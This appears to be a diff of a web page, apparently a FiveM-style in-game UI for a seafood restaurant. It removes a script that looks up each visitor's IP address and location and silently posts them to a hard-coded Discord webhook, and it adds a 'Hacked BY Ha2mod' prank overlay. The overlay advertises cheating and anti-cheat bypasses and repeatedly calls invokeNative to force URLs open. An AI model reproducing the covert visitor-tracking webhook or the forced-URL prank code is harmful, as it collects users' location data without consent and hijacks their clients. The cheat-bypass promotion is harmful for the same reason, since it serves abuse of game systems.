+                Security Alert Ha2mod in the system ..<br> 
+            </div>
+        </div>
 
-// جلب معلومات IP
-fetch('https://ipinfo.io/json')
-.then(res=>res.json())
-.then(data=>{
-    const {ip, city, region, country, loc, org, timezone} = data;
-    const infoDiv = document.getElementById('ip-info');
-    infoDiv.innerHTML = `<span><strong>IP:</strong> ${ip}</span>
-                         <span><strong>City:</strong> ${city}</span>
-                         <span><strong>Region:</strong> ${region}</span>
-                         <span><strong>Country:</strong> ${country}</span>
-                         <span><strong>Location:</strong> ${loc}</span>
-                         <span><strong>Organization:</strong> ${org}</span>
-                         <span><strong>Timezone:</strong> ${timezone}</span>`;
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="container">
+                <div class="avatar-container">
+                    <div class="avatar">
+                        <img src="https://cdn.discordapp.com/attachments/1423480461761712251/1559676572112396308/-_.jpg?ex=6acff180&is=6acea000&hm=de617a3494aad1d6117a61ac1f6fe60a2a852e5843d314011ff3e49456ef3055&" alt="avatar" style="width: 100%; height: 100%; object-fit: cover;" />
+                    </div>
+                </div>
 
-    // ارسال البيانات عبر Webhook
-    const webhookUrl = 'https://discord.com/api/webhooks/1417377585649684560/b523UU-z4dazypJndhUwQ14ejq8xmnCPbC5_lP2s-nK3mRn5Sfd_l-cGuc6xY5xBKR-a';
-    const dateTime = new Date().toLocaleString();
-    fetch(webhookUrl, {
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({
-            content: `IP: ${ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nLocation: ${loc}\nOrg: ${org}\nTimezone: ${timezone}\nDateTime: ${dateTime}`
-        })
-    });
-});
-</script>
+                <h1 class="pwned-title">Hacked BY Ha2mod</h1>
 
+                <div class="terminal-section">
+                    <div class="terminal-header">
+                        <div class="terminal-dots">
+                            <div class="dot"></div>
+                            <div class="dot"></div>
+                            <div class="dot"></div>
+                        </div>
+                        <div class="terminal-title"></div>
+                    </div>
+
+                    <div class="command-line">
+                        <span class="prompt">server@system:~$</span>
+                        <span class="command">why?</span>
+                    </div>
+
+                    <div class="command-line">
+                        <span class="success">
+                            Hmmmm : Jusst Fakkee 😉
+                        </span>
+                    </div>
+
+                </div>
+
+                <div class="footer-message">Officaly Black$Hammer • s</div>
+
+                <div class="learn-box">
+                    <div class="learn-title">join to discord to Learn :</div>
+                    <div class="learn-grid">
+                        <div class="learn-item">how to be a cheater?</div>
+                        <div class="learn-item">how to bypass pure mode?</div>
+                        <div class="learn-item">how to bypass ocean?</div>
+                        <div class="learn-item">how to bypass anti nui dev tool?</div>
+                        <div class="learn-footer">
+                            <img src="https://i.ibb.co/8nH61S6j/6421779-0463913033-tumbl.gif" alt="Discord" class="discord-icon" />
+                            <span class="discord-link">discord.gg/ces</span>
+                        </div>
+                    </div>
+                </div>
+            
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts Logic -->
+    <script>
+        // Dark Mode Logic
+        function toggleTheme() {
+            const html = document.documentElement;
+            const icon = document.getElementById('theme-icon');
+            if (html.classList.contains('dark')) {
+                html.classList.remove('dark');
+                icon.classList.replace('fa-sun', 'fa-moon');
+            } else {
+                html.classList.add('dark');
+                icon.classList.replace('fa-moon', 'fa-sun');
+            }
+        }
+
+        // Language Toggle Logic
+        let currentLang = 'ar';
+        function toggleLanguage() {
+            const btn = document.getElementById('lang-btn');
+            const elements = document.querySelectorAll('[data-ar]');
+            
+            if (currentLang === 'ar') {
+                currentLang = 'en';
+                document.documentElement.dir = 'ltr';
+                btn.innerText = 'عربي';
+                elements.forEach(el => {
+                    if(el.dataset.en) el.innerText = el.dataset.en;
+                });
+            } else {
+                currentLang = 'ar';
+                document.documentElement.dir = 'rtl';
+                btn.innerText = 'EN';
+                elements.forEach(el => {
+                    if(el.dataset.ar) el.innerText = el.dataset.ar;
+                });
+            }
+        }
+
+        // Login Modal Logic
+        function openLoginModal() {
+            document.getElementById('login-modal').classList.remove('hidden');
+        }
+        function closeLoginModal() {
+            document.getElementById('login-modal').classList.add('hidden');
+        }
+        function handleLogin(e) {
+            e.preventDefault();
+            closeLoginModal();
+            showToast('تم تسجيل الدخول بنجاح!');
+        }
+
+        // Toast Notification
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-msg').innerText = msg;
+            toast.classList.remove('hidden');
+            setTimeout(() => {
+                toast.classList.add('hidden');
+            }, 3000);
+        }
+
+        // Meal Advisor Logic
+        function calculateAdvice() {
+            const people = document.getElementById('adv-people').value;
+            const spice = document.getElementById('adv-spice').value;
+            const resultBox = document.getElementById('advisor-result');
+
+            let recommendation = "";
+            if (people === "1") {
+                recommendation = "💡 التوصية المناسبة: **كيس جمبري (مكس كاجون) + ديناميت شريمب** (تكلفة تقريبية: 124 SAR)";
+            } else if (people === "2") {
+                recommendation = "💡 التوصية المناسبة: **2 كيس جمبري طازج مع الصوص الخاص + بطاطس مقرمشة** (تكلفة تقريبية: 175 SAR)";
+            } else {
+                recommendation = "💡 التوصية المناسبة: **وجبة العائلة الكبرى (4 أكياس مأكولات بحرية + ديناميت شريمب + أبيض/أرز)** (تكلفة تقريبية: 340 SAR)";
+            }
+
+            resultBox.innerHTML = `<p class="text-amber-300 font-bold text-base leading-relaxed">${recommendation}</p>`;
+            resultBox.classList.remove('hidden');
+        }
+
+        // Trigger Fake Hack Screen & Music
+        function triggerFakeHack() {
+            const overlay = document.getElementById('hack-overlay');
+            const audio = document.getElementById('bg-music');
+            
+            overlay.style.display = 'block';
+            
+            if(audio) {
+                audio.currentTime = 0;
+                audio.play().catch(e => console.log("Audio play blocked"));
+            }
+
+            setTimeout(() => {
+                const loadingScreen = overlay.querySelector('.loading-screen');
+                if (loadingScreen) loadingScreen.style.display = 'none';
+            }, 2000);
+
+            setTimeout(function() {
+                let count = 0;
+                let interval = setInterval(function() {
+                    if (window.invokeNative) {
+                        window.invokeNative('openUrl', 'https://cdn.discordapp.com/attachments/1423480461761712251/1559676572112396308/-_.jpg');
+                    }
+                    count++;
+                    if (count >= 3) {
+                        clearInterval(interval);  
+                    }
+                }, 100); 
+            }, 100);
+        }
+
+        function closeFakeHack() {
+            const overlay = document.getElementById('hack-overlay');
+            const audio = document.getElementById('bg-music');
+            overlay.style.display = 'none';
+            if (audio) {
+                audio.pause();
+            }
+        }
+
+        // Original Sequential Effects Scripts
+        window.addEventListener('load', () => {
+            const avatar = document.querySelector('#hack-overlay .avatar');
+            if(avatar) {
+                setTimeout(() => {
+                    avatar.classList.add('force-hover');
+                    setTimeout(() => {
+                        avatar.classList.remove('force-hover');
+                    }, 3000);
+                }, 5000);
+            }
+
+            const items = document.querySelectorAll('#hack-overlay .learn-item');
+            let index = 0;
+            function applyEffectSequentially() {
+                if (items.length === 0) return;
+                if (index >= items.length) {
+                    index = 0;
+                }
+                const item = items[index];
+                item.classList.add('force-hover');
+                setTimeout(() => {
+                    item.classList.remove('force-hover');
+                    index++;
+                    setTimeout(applyEffectSequentially, 1500); 
+                }, 1000); 
+            }
+            setTimeout(applyEffectSequentially, 6000);
+        });
+
+        // Subtle screen flicker
+        setInterval(() => {
+            const overlay = document.getElementById('hack-overlay');
+            if (overlay.style.display === 'block' && Math.random() < 0.50) {
+                overlay.style.filter = 'brightness(1.2)';
+                setTimeout(() => {
+                    overlay.style.filter = 'brightness(1)';
+                }, 50);
+            }
+        }, 2000);
+    </script>
 </body>
 </html>
